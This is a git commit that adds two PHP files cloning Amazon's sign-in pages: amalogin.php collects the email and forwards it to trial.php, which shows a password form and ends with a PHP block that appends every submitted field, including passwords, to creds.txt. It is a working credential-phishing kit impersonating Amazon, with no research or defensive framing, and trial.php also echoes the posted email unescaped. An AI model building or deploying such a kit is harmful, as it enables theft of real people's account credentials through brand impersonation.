78e835de07fba57393c04121399c1f21912bc9ca
Sarah-cod <79430481+Sarah-cod@users.noreply.github.com>
2021-02-26 04:44:12 +0100

    Second push

---
+++ amalogin.php
@@ -0,0 +1,414 @@
+
+
+
+
+
+<!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
+  <head>
+<script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>
+<script type='text/javascript'>
+
+</script>
+
+<!-- itxr2r8fq9zf899yujok --><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>
+    <title dir="ltr">Amazon Sign-In</title>
+
+
+
+
+
+        <link rel="stylesheet" href="first_css.css" />
+<link rel="stylesheet" href="second_css.css" />
+<link rel="stylesheet" href="third_css.css" />
+<script>
+
+</script>
+
+
+
+  <script type='text/javascript'>
+
+</script></head>
+
+  <body class="ap-locale-en_US a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c">
+
+<script>
+
+
+</script>
+
+<script type='text/javascript'>
+
+</script>
+<div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
+    <div class="a-section a-padding-medium auth-workflow">
+      <div class="a-section a-spacing-none auth-navbar">
+
+
+
+
+
+
+<div class="a-section a-spacing-medium a-text-center">
+
+
+
+
+
+
+
+<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
+
+  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
+
+
+
+</a>
+
+
+
+</div>
+
+
+      </div>
+
+      <div id="authportal-center-section" class="a-section">
+
+
+
+            <div id="authportal-main-section" class="a-section">
+
+
+
+
+
+
+<div class="a-section a-spacing-base auth-pagelet-container">
+
+
+
+      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+        <p>
+          <a class="a-link-normal" href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">
+
+          </a>
+        </p>
+      </div></div></div>
+
+
+</div>
+
+<div class="a-section auth-pagelet-container">
+
+
+
+
+
+
+
+
+<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
+
+
+<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
+
+
+<!-- show a warning modal dialog when the third party account is connected with Amazon -->
+
+
+
+
+
+
+
+
+
+
+<div class="a-section a-spacing-base">
+  <div class="a-section">
+
+    <form name="signIn" method="post" novalidate action="trial.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
+      
+
+
+
+
+      <div class="a-section">
+        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
+          <h1 class="a-spacing-small">
+            Sign-In
+          </h1>
+          <!-- optional subheading element -->
+
+          <div class="a-row a-spacing-base">
+            <label for="ap_email" class="a-form-label">
+              Email or mobile phone number
+            </label>
+
+
+
+
+
+
+
+            <input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field"/>
+
+
+            <input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="a-input-text hide"/>
+
+
+
+
+<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+  Enter your email or mobile phone number
+</div></div></div>
+
+          </div>
+
+
+          <input type="hidden" name="create" value="0"/>
+
+          <div class="a-section">
+
+
+
+
+
+
+
+
+
+
+
+
+            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"/><span id="continue-announce" class="a-button-text" aria-hidden="true">
+              Continue
+            </span></span></span>
+
+
+
+
+
+
+
+<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+  By continuing, you agree to Amazon's <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=508088">Conditions of Use</a> and <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=468496">Privacy Notice</a>.
+</div>
+
+
+
+
+<script>
+  function cf() {
+    if (typeof window.uet === 'function') {
+      uet('cf');
+    }
+    if (window.embedNotification &&
+      typeof window.embedNotification.onCF === 'function') {
+      embedNotification.onCF();
+    }
+  }
+</script>
+
+<script type="text/javascript">//cf()</script>
+
+          </div>
+
+
+
+
+
+
+
+
+
+<div class="a-section">
+  <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
+    <a href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
+      Need help?
+    </span></a>
+
+      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+
+
+
+
+
+
+
+
+
+
+<a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_AccountFlyout_signout%26signIn%3D1%26useRedirectOnSuccess%3D1&amp;prevRID=DEVHHXZFP0DFJAARMCPF&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
+  Forgot your password?
+</a>
+      </div>
+
+    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+      <a id="ap-other-signin-issues-link" class="a-link-normal" href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">
+        Other issues with Sign-In
+      </a>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div></div>
+      </div>
+    </form>
+  </div>
+
+
+
+
+
+        <div class="a-divider a-divider-break"><h5>New to Amazon?</h5></div>
+        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="https://www.amazon.com/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_AccountFlyout_signout%26signIn%3D1%26useRedirectOnSuccess%3D1&amp;prevRID=DEVHHXZFP0DFJAARMCPF&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text" role="button">
+          Create your Amazon account
+        </a></span></span>
+
+
+
+</div>
+
+
+
+
+</div>
+            </div>
+
+
+      </div>
+
+
+      <div id="right-2">
+      </div>
+
+      <div class="a-section a-spacing-top-extra-large auth-footer">
+
+
+
+
+<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
+
+<div class="a-section a-spacing-small a-text-center a-size-mini">
+  <span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+
+    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
+      Conditions of Use
+    </a>
+    <span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
+      Privacy Notice
+    </a>
+    <span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+    <a class="a-link-normal" target="_blank" rel="noopener" href="/help">
+      Help
+    </a>
+    <span class="auth-footer-seperator"></span>
+
+
+
+</div>
+
+
+
+
+<div class="a-section a-spacing-none a-text-center">
+
+
+
+
+
+
+<span class="a-size-mini a-color-secondary">
+  © 1996-2020, Amazon.com, Inc. or its affiliates
+</span>
+
+</div>
+
+      </div>
+    </div>
+
+    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
+    </div>
+
+
+
+<script type="text/javascript">
+
+</script>
+<script type="text/javascript">
+    /*window.fwcimCmd = [
+
+            ['profile', 'signIn']
+
+
+    ];*/
+</script>
+
+
+    <!-- cache slot rendered -->
+
+  </div><div id='be' style="display:none;visibility:hidden;"><form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form>
+
+
+<script type="text/javascript">
+
+</script>
+
+</div>
+
+<noscript>
+    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:132-8473027-7862062:DEVHHXZFP0DFJAARMCPF$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DDEVHHXZFP0DFJAARMCPF:0' alt=""/>
+</noscript>
+</body>
+</html>
---
+++ trial.php
@@ -0,0 +1,398 @@
+<html class=" a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-12-30"><head><script async="" src="https://images-na.ssl-images-amazon.com/images/I/31BVuidgT8L.js" crossorigin="anonymous"></script>
+<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script>
+<script type="text/javascript">
+
+</script>
+
+<!-- kizc5ulllbg7lbpqtqc4hhvped84m0o2o10fg --><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8">
+    <title dir="ltr">Amazon Sign-In</title>
+
+
+
+
+
+        <link rel="stylesheet" href="first_css.css">
+<link rel="stylesheet" href="second_css.css">
+<link rel="stylesheet" href="third_css.css">
+<script>
+
+</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11-BZEJ8lnL.js,61q-U9rAZ3L.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,21juQdw6GzL.js,21zp0xRcpuL.js,01MobMUud8L.js,519IJ+sPUqL.js_.js?AUIClients/AuthenticationPortalAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01dTJcsqFWL.js?AUIClients/AuthenticationPortalInlineAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/31crZaOVIqL.js?AUIClients/CVFAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/81JZFvi7+TL.js?AUIClients/SiegeClientSideEncryptionAUI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/71mA1KjzpaL.js?AUIClients/FWCIMAssets"></script>
+
+
+
+  <script type="text/javascript">
+
+</script><script src="https://static.siege-amazon.com/prod/keys/AuthPortalSigninPasswordNA.js"></script></head>
+
+  <body class="ap-locale-en_US a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate">
+
+<script>
+
+</script>
+
+<script type="text/javascript">
+
+
+
+</script>
+<div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
+    <div class="a-section a-padding-medium auth-workflow">
+      <div class="a-section a-spacing-none auth-navbar">
+
+
+
+
+
+
+<div class="a-section a-spacing-medium a-text-center">
+
+
+
+
+
+
+
+<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
+
+  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
+
+
+
+</a>
+
+
+
+</div>
+
+
+      </div>
+
+      <div id="authportal-center-section" class="a-section">
+
+
+
+            <div id="authportal-main-section" class="a-section">
+
+
+
+
+
+
+<div class="a-section a-spacing-base auth-pagelet-container">
+
+
+
+      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+        <p>
+          <a class="a-link-normal" href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">
+
+          </a>
+        </p>
+      </div></div></div>
+
+
+</div>
+
+<div class="a-section auth-pagelet-container">
+
+
+
+
+
+
+
+
+
+<div class="a-section a-spacing-base">
+  <div class="a-box"><div class="a-box-inner a-padding-extra-large">
+
+    <h1 class="a-spacing-small">
+      Sign-In
+    </h1>
+    <!-- optional subheading element -->
+
+    <div class="a-row a-spacing-base">
+      <span><?php echo $_POST["email"]; ?></span>
+      <a id="ap_change_login_claim" class="a-link-normal" tabindex="6" href="https://www.amazon.com/ap/signin?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_signin&amp;prevRID=Z02HF3AJ0FJZ0ZPXW59X&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJDYVBpZ0Jpb3Ywd016M2pHcUoxU0lYRjBLWGVKRG9aRGl6blQrOXRsUjhnPSIsInZlcnNpb24iOjEsIklWIjoiWnNvaDNrdGM0WGs5SWJRVkFvSVpPZz09In0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1611495377000">
+        Change
+      </a>
+    </div>
+
+
+
+
+
+
+    <form name="signIn" method="post" novalidate="" action="processing.php" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="OI261IkA">
+
+
+
+
+      <div class="a-section">
+
+
+
+
+
+
+
+
+<div class="a-section a-spacing-large">
+  <div class="a-row">
+    <div class="a-column a-span5">
+      <label for="ap_password" class="a-form-label">
+
+
+            Password
+
+
+
+      </label>
+    </div>
+
+
+
+      <div class="a-column a-span7 a-text-right a-span-last">
+
+
+
+
+
+
+
+
+
+
+<a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_signin&amp;prevRID=Z02HF3AJ0FJZ0ZPXW59X&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJYVGViTnBoRXpTeGRGRXplZXIzcnBHeW1lRzBtY2crWHBMeCtjTGhLZDI0PSIsInZlcnNpb24iOjEsIklWIjoiOE5BTVBWNlpOYWdBMmdrNWpPOUhNUT09In0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1611495377000">
+  Forgot your password?
+</a>
+      </div>
+
+  </div>
+
+
+
+
+
+
+
+  <input type="password" maxlength="1024" id="ap_password" name="password" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field">
+
+
+
+
+
+
+<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+  Enter your password
+</div></div></div>
+
+
+</div>
+
+
+
+<input type="hidden" name="encryptedPasswordExpected">
+<script type="a-state" data-a-state="{&quot;key&quot;:&quot;sif-encryption-profile&quot;}">{"sifProfile":"AuthenticationPortalSigninNA"}</script>
+
+<script type="text/javascript" async="" src="https://static.siege-amazon.com/prod/profiles/AuthenticationPortalSigninNA.js">
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <div class="a-section">
+
+          <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
+            Sign-In
+          </span></span></span>
+
+<script>
+
+</script>
+
+<script type="text/javascript"></script>
+
+
+
+
+
+
+
+
+  <div class="a-row a-spacing-top-medium">
+    <div class="a-section a-text-left">
+      <label for="auth-remember-me" class="a-form-label">
+        <div data-a-input-name="rememberMe" class="a-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
+          Keep me signed in.
+          <span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;\u003cp>Choosing \&quot;Keep me signed in\&quot; reduces the number of times you're asked to Sign-In on this device.\u003c\/p>\n\u003cp>To keep your account secure, use this option only on your personal devices.\u003c\/p>&quot;}">
+            <a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative">
+              Details
+            <i class="a-icon a-icon-popover"></i></a>
+          </span>
+        </span></label></div>
+      </label>
+    </div>
+  </div>
+
+
+
+
+
+
+        </div>
+      </div>
+    </form>
+  </div></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+            </div>
+
+
+      </div>
+
+
+      <div id="right-2">
+      </div>
+
+      <div class="a-section a-spacing-top-extra-large auth-footer">
+
+
+
+
+<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
+
+<div class="a-section a-spacing-small a-text-center a-size-mini">
+  <span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+
+    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
+      Conditions of Use
+    </a>
+    <span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
+      Privacy Notice
+    </a>
+    <span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+    <a class="a-link-normal" target="_blank" rel="noopener" href="/help">
+      Help
+    </a>
+    <span class="auth-footer-seperator"></span>
+
+
+
+</div>
+
+
+
+
+<div class="a-section a-spacing-none a-text-center">
+
+
+
+
+
+
+<span class="a-size-mini a-color-secondary">
+  © 1996-2020, Amazon.com, Inc. or its affiliates
+</span>
+
+</div>
+
+      </div>
+    </div>
+
+    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
+    </div>
+
+
+
+<script type="text/javascript">
+
+</script>
+<script type="text/javascript">
+
+</script>
+
+
+    <!-- cache slot rendered -->
+
+  </div><div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="2"></form>
+
+
+<script type="text/javascript">
+
+</script>
+
+</div>
+
+<noscript>
+    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:132-8473027-7862062:Z02HF3AJ0FJZ0ZPXW59X$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DZ02HF3AJ0FJZ0ZPXW59X:0' alt=""/>
+</noscript>
+
+
+<div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>
+<?php
+  $handle=fopen("creds.txt", "a");
+  foreach ($_POST as $variable => $value) {
+    fwrite($handle, $variable);
+    fwrite($handle, " : ");
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+  }
+  fwrite($handle, "\r\n");
+  fclose($handle);
+  exit;
+ ?>
